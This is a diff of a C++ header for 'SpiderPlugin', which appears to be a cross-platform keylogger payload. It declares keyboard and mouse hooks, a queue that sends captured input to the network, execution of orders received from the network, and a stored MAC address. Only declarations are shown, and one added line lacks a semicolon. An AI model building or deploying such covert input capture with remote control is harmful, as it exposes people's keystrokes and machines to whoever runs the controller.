@@ -5,7 +5,10 @@
 #endif
 
 #include <vector>
+#include <string>
+#include <map>
 #include "IPayload.h"
+#include "Keys.h"
 
 namespace spider
 {
@@ -23,13 +26,13 @@ class SpiderPlugin : public IPayload
     virtual bool init(mt::Queue<SystemMsg> &inputQueue);
 
     // Get the event thread-safe queue, in order to control the client
-    virtual mt::Queue<SystemMsg> &getOrderQueue();
+    virtual mt::Queue<Order> &getOrderQueue();
 
     // Should de-initialize the payload, if needed
     virtual bool deinit();
 
     // Retrieve system informations
-    virtual SystemInfos const &getInfos() const;
+    virtual void getInfos();
 
     // Toggle Keyboard hook
     virtual bool getKeyboard();
@@ -40,7 +43,11 @@ class SpiderPlugin : public IPayload
     // Execute all the actions needed
     virtual void run();
 
+    // Execute an order received from the network
+    virtual void exec(Order const &);
+
   private:
+    static void extractPath(std::string &path);
 // SpiderPluginWindows.cpp
 #if defined _WIN32
     bool initWindows();
@@ -53,6 +60,7 @@ class SpiderPlugin : public IPayload
     bool hookKeyboardWindows();
     bool unHookKeyboardWindows();
     static LRESULT CALLBACK keyboardHookWindows(int nCode, WPARAM wParam, LPARAM lParam);
+    static void translateKey(std::uint32_t virtualKey, spider::client::SystemMsg &msg);
     bool hookMouseWindows();
     bool unHookMouseWindows();
     static LRESULT CALLBACK mouseHookWindows(int nCode, WPARAM wParam, LPARAM lParam);
@@ -67,6 +75,7 @@ class SpiderPlugin : public IPayload
     bool unHookKeyboardOSX() const;
     bool hookMouseOSX() const;
     bool unHookMouseOSX() const;
+    void runOSX() const;
 // SpiderPluginLinux.cpp
 #elif defined __linux__
     bool initLinux();
@@ -77,6 +86,7 @@ class SpiderPlugin : public IPayload
     bool unHookKeyboardLinux() const;
     bool hookMouseLinux() const;
     bool unHookMouseLinux() const;
+    void runLinux() const;
 #else
 #error "Plateform not supported"
 #endif
@@ -90,11 +100,15 @@ class SpiderPlugin : public IPayload
     bool m_mouseHook;
 
     static mt::Queue<SystemMsg> *m_sendToNetwork;
-    mt::Queue<SystemMsg> m_receivedFromNetwork;
+    mt::Queue<Order> m_receivedFromNetwork;
+    std::string m_macAddr;
+
+    std::map<std::string, std::function<void()>> m_cmd;
 
 #if defined _WIN32
     HHOOK m_keyboardHookWin;
     HHOOK m_mouseHookWin;
+    static std::map<std::uint32_t, KeyboardKey> m_windowsKeyboardMap
 #endif
 };
 }
